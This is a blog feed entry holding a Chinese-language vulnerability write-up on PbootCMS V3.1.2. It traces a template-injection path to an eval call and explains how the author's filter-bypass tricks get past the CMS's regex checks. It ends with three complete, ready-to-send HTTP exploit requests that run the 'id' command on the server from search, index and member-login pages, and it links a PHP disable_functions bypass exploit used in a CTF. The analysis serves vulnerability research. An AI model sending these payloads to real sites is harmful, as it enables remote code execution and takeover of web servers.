<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Suanve - Blog</title>
  
  
  <link href="https://susec.me/atom.xml" rel="self"/>
  
  <link href="https://susec.me/"/>
  <updated>2022-02-28T07:52:09.220Z</updated>
  <id>https://susec.me/</id>
  
  <author>
    <name>Suanve</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pboot cms V3.1.2 &quot;虚假的无文件落地RCE&quot;</title>
    <link href="https://susec.me/2021/11/22/pboot-cms-V3-1-2-%E8%99%9A%E5%81%87%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0RCE/"/>
    <id>https://susec.me/2021/11/22/pboot-cms-V3-1-2-%E8%99%9A%E5%81%87%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0RCE/</id>
    <published>2021-11-22T03:49:14.000Z</published>
    <updated>2022-02-28T07:52:09.220Z</updated>
    
    <content type="html"><![CDATA[<p>  Auth: EDI安全&#x2F;suanve</p><h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h3><p>上次电脑送修我就买了个mini  一直用macmini 结果 本子修好以后拿回来也忘了看</p><p>苹果售后把我系统分区重装了 导致没有php环境 brew在macos 12上也不能正常工作 </p><p>这就直接导致西湖比赛的时候我vardump调试也没调出个所以然（还被大佬喷 （确实 挺简单的一个漏洞</p><p>今天回XX以后 调试了一下</p><p><img src="https://github.com/suanve/files/blob/main/image-20211121212638508.png?raw=true" alt="image-20211121212638508"></p><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="1 分析"></a>1 分析</h3><p>根据历史漏洞可以知道在前台 有一个 ssti</p><p>搜索<code>eval</code>可以找到<code>eval(&#39;if(&#39; . $matches[1][$i] . &#39;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#39;);</code></p><p>eval出自<code>parserIfLabel</code>函数</p><p>找<code>parserIfLabel</code>调用可以找到<code>parserAfter</code></p><p>找<code>parserAfter</code>调用可以找到<code>SearchController-index</code></p><p>在<code>parserAfter</code>函数中 可以看到获取了<code>keyword</code>关键字</p><p><img src="https://github.com/suanve/files/blob/main/image-20211121215312588.png?raw=true" alt="image-20211121215312588"></p><p>（有的初学者可能就觉得问题出现在这里了 我比赛的时候也是犯了这个错误 实际上这里的逻辑写的挺好的  取参的时候 会通过正则来校验输入  如果不符合就把传入的数据置空  恶意操作基本进不去</p><p>（但是。。。开发者在加载模板的时候 其实已经把我们的payload放入<code>$content</code>了所以get里的限制就限制了个寂寞</p><p>开始分析 </p><p>先把payload带进去 在刚加载（渲染）完模板的时候  可以看到已经把恶意语句加载进来了</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122021300121.png?raw=true" alt="image-20211122021300121"></p><p><img src="https://github.com/suanve/files/blob/main/image-20211122021252573.png?raw=true" alt="image-20211122021252573"></p><p>所以他的<code>get</code>函数中几个限制完全没起到作用（其实漏洞点不在keyword关键字 后面会详细说</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122021411827.png?raw=true" alt="image-20211122021411827"></p><p><img src="https://github.com/suanve/files/blob/main/image-20211122021447583.png?raw=true" alt="image-20211122021447583"></p><p>可以看到 <code>get</code>方法内到各种限制操作 确实把不符合规则的keyword给置null了 但是其实content里的还在</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122021633025.png?raw=true" alt="image-20211122021633025"></p><p>所以这里跟进看一下最初始的渲染模板部分 首先在这里是加载模板 渲染基础部分生成缓存</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122022234500.png?raw=true" alt="image-20211122022234500"></p><p>然后包含缓存后 在这里发现了 echo URL; 这里保存的还是完整url</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122022335666.png?raw=true" alt="image-20211122022335666"></p><p>问题就是出在这里了  继续往下看 可以看到<code>$content = ob_get_contents();</code> 行吧 直接把url输出然后保存到<code>$content</code>里了。</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122022523389.png?raw=true" alt="image-20211122022523389"></p><p>即使下面他多次获取keyword时试图不把违规字符带入模板</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122022956063.png?raw=true" alt="image-20211122022956063"></p><p><img src="https://github.com/suanve/files/blob/main/image-20211122023037670.png?raw=true" alt="image-20211122023037670"></p><p>都没有一点意义</p><p>细心的小伙伴可能发现了 这个问题好像是出在二维码生成标签这个位置的 而在进入我们关键点之前 就有这么一次操作</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122023726575.png?raw=true" alt="image-20211122023726575"></p><p>跟进去看一眼 </p><p><img src="https://github.com/suanve/files/blob/main/image-20211122023846926.png?raw=true" alt="image-20211122023846926"></p><p>嗯 他匹配了我们二维码这个标签的内容 然后将其生成二维码链接 （所以大家知道了吧 漏洞实际上出在他对模板的渲染部分上 这就导致所有和模板渲染的地方 都会存在这个问题（其实就是只要有二维码分享的页面 都可以触发我们后面的payload</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122023952696.png?raw=true" alt="image-20211122023952696"></p><p>所以我们想利用这里的话 只需要针对上面的正则<code>/\&#123;pboot:qrcode(\s+[^&#125;]+)?\&#125;/</code>做文章就好了</p><p>我们提取出关键的这一行html 发现会被完整的匹配到</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122024138409.png?raw=true" alt="image-20211122024138409"></p><p>结合正则很容易理解 括号成对嘛 所以我们给他加一个<code>&#125;</code>他不就匹配不到我们的payload了</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122024236203.png?raw=true" alt="image-20211122024236203"></p><p>至此 我们已经完整的解决了<code>&#123;&#125;</code>带入模板的问题 </p><p>接下来就直接把经过各种操作的<code>$content</code>带到了<code>parserIfLabel</code> 函数 也就是存在eval的地方</p><p><img src="https://github.com/suanve/files/blob/main/image-20211121215331403.png?raw=true" alt="image-20211121215331403"></p><p>百度找找历史文章分析就知道无非就是绕那几个正则 </p><p>(推荐一个网站  <a href="https://regex101.com/">https://regex101.com/</a> 挺好用的</p><p>牵扯到之该cms之前的几个漏洞 我们可以知道完成以下两点即可实现rce</p><ol><li><p>绕过函数执行正则</p><p><img src="https://github.com/suanve/files/blob/main/image-20211121215418614.png?raw=true" alt="image-20211121215418614"></p></li><li><p>绕过参数正则</p><p><img src="https://github.com/suanve/files/blob/main/image-20211121215500061.png?raw=true" alt="image-20211121215500061"></p></li></ol><p>一个个来</p><h4 id="绕过函数执行正则"><a href="#绕过函数执行正则" class="headerlink" title="绕过函数执行正则"></a>绕过函数执行正则</h4><p>说几个知识点 大家都懂得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">func</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">func</span> (<span class="number">1</span>);</span><br><span class="line">func<span class="comment">/**/</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">func</span></span><br><span class="line">  (<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>pbootcms的函数执行检测正则长这样</p><p><code>([\w]+)([\x00-\x1F\x7F\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(</code></p><p>大概了解一下以后 嗯。。。还想啥 直接fuzz就好啦</p><p><img src="https://github.com/suanve/files/blob/main/image-20211121213523996.png?raw=true" alt="image-20211121213523996"></p><p>？？ 咋四种都不行</p><p>但是大家别忘了啊 第三种有注释啊&#x2F;**&#x2F;</p><p><img src="https://github.com/suanve/files/blob/main/image-20211121213614962.png?raw=true" alt="image-20211121213614962"></p><p>你只匹配<code>([\w+])</code>那我加一个<code>-</code>你还能匹配到吗？你匹配不到了吧。</p><h4 id="绕过参数获取的正则"><a href="#绕过参数获取的正则" class="headerlink" title="绕过参数获取的正则"></a>绕过参数获取的正则</h4><p>这里我没有详细的去研究怎么绕关键字意义不大 毕竟是ctfer 用点 ctf技巧就派上用场了（网上的漏洞分析有两个关键函数 可以直接用</p><p><code>get_lg</code>和<code>get_backurl</code></p><p>他俩都在function.php</p><p><img src="https://github.com/suanve/files/blob/main/image-20211121213754730.png?raw=true" alt="image-20211121213754730"></p><p>get_lg 是从 cookie lg字段取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前语言并进行安全处理Å</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_lg</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$lg</span> = <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;lg&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$lg</span> || ! <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\w\-]+$/&#x27;</span>, <span class="variable">$lg</span>)) &#123;</span><br><span class="line">        <span class="variable">$lg</span> = <span class="title function_ invoke__">get_default_lg</span>();</span><br><span class="line">        <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;lg&#x27;</span>, <span class="variable">$lg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lg</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_backurl从get取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取返回URL</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_backurl</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! ! <span class="variable">$backurl</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;backurl&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]) &amp;&amp; ! ! <span class="title function_ invoke__">get</span>(<span class="string">&#x27;p&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&amp;backurl=&quot;</span> . <span class="variable">$backurl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;?backurl=&quot;</span> . <span class="variable">$backurl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以使用这两个函数 搭配函数执行方式 就能绕过正则</p><h3 id="2-利用"><a href="#2-利用" class="headerlink" title="2 利用:"></a>2 利用:</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/keyword?keyword=&#125;&#123;pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))&#125;123321suanve&#123;/pboot:if&#125;&amp;backurl=;id</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:80</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Originating-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://github.com/suanve/files/blob/main/image-20211122024659767.png?raw=true" alt="image-20211122024659767"></p><h4 id="任意页面皆可rce"><a href="#任意页面皆可rce" class="headerlink" title="任意页面皆可rce"></a>任意页面皆可rce</h4><p>根据刚刚所说的 他实际上不是search控制器的问题所以任意页面都可以调用</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/?suanve=&#125;&#123;pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))&#125;123321suanve&#123;/pboot:if&#125;&amp;backurl=;id</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:80</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Originating-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://github.com/suanve/files/blob/main/image-20211122030306637.png?raw=true" alt="image-20211122030306637"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?member/login/?suanve=&#125;&#123;pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))&#125;123321suanve&#123;/pboot:if&#125;&amp;backurl=;id</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:80</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Originating-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://github.com/suanve/files/blob/main/image-20211122030414697.png?raw=true" alt="image-20211122030414697"></p><p>漏洞的挖掘大多数都是站在前人的肩膀上 我也不例外</p><p>这样一个调一调就出来了的洞 大家应该都有 公开也没什么不好 </p><h3 id="x-有关西湖论剑ctf"><a href="#x-有关西湖论剑ctf" class="headerlink" title="x 有关西湖论剑ctf"></a>x 有关西湖论剑ctf</h3><p>有disablefunction和openbasedir </p><p>php7.2开始弃用了create_function但是没移除 还是可以用的 所以调用</p><p><a href="https://github.com/mm0r1/exploits/tree/master/php-filter-bypass">https://github.com/mm0r1/exploits/tree/master/php-filter-bypass</a></p><p>“pwn”一下就好了</p><p><img src="https://github.com/suanve/files/blob/main/image-20211122020053474.png?raw=true" alt="image-20211122020053474"></p><h2 id="欢迎关注”EDI安全”"><a href="#欢迎关注”EDI安全”" class="headerlink" title="欢迎关注”EDI安全”"></a>欢迎关注”EDI安全”</h2><p><img src="https://github.com/suanve/files/blob/main/61637560482_.pic.jpg?raw=true" alt="61637560482_.pic"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  Auth: EDI安全&amp;#x2F;suanve&lt;/p&gt;
&lt;h3 id=&quot;0-前言&quot;&gt;&lt;a href=&quot;#0-前言&quot; class=&quot;headerlink&quot; title=&quot;0 前言&quot;&gt;&lt;/a&gt;0 前言&lt;/h3&gt;&lt;p&gt;上次电脑送修我就买了个mini  一直用macmini 结</summary>
      
    
    
    
    <category term="代码审计" scheme="https://susec.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="php" scheme="https://susec.me/tags/php/"/>
    
    <category term="代码审计" scheme="https://susec.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="pbootcms" scheme="https://susec.me/tags/pbootcms/"/>
    
  </entry>
  
</feed>
